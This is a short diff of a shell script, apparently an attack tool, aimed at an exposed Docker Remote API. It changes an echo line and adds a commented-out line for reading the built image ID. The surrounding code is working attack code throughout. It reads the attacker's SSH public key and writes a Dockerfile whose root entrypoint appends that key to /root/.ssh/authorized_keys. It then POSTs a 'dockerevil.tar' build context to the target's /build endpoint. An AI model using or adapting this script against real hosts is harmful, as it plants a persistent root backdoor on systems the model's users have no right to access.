@@ -61,7 +61,7 @@ then
 
 	echo "Getting thy SSH key..."
 	RSA=$(cat ~/.ssh/id_rsa.pub | awk '/ssh-rsa/ {print $2}')
-	echo "Done\n"
+	echo -e "Done\n"
 
 	echo "Writing Dockerfile..."
 	echo -e "FROM $IMG_ID \nUSER root \nENTRYPOINT echo '"$RSA"' >> /root/.ssh/authorized_keys" > Dockerfile
@@ -86,7 +86,8 @@ then
 
 	echo "Building image with custom entrypoint..."
 	curl -s -XPOST -H "Content-type: application/x-tar" --data-binary @dockerevil.tar "http://$HOST/build" ##Please change this shit >>> | grep -o "built ............" > skiddie
-
+##NEW
+##IMG_ID=$(curl -s -XPOST -H "Content-type: application/x-tar" --data-binary @dockerevil.tar "http://$HOST/build" | awk '/built/ {print $3}' | sed 's/.\{5\}$//')
 
 
 	IMG_ID=$( cut -d " " -f2,2 skiddie)
